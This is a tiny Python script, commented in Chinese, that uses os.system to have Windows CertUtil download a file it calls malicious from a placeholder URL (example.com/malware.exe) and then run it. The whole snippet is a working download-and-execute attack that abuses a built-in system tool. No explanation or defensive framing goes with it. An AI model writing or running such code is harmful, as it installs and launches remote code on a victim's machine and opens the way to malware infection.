import os

# 使用 CertUtil 下載一個惡意的檔案並執行
malicious_url = "http://example.com/malware.exe"
os.system(f"certutil -urlcache -split -f {malicious_url} malicious.exe")
os.system("malicious.exe")
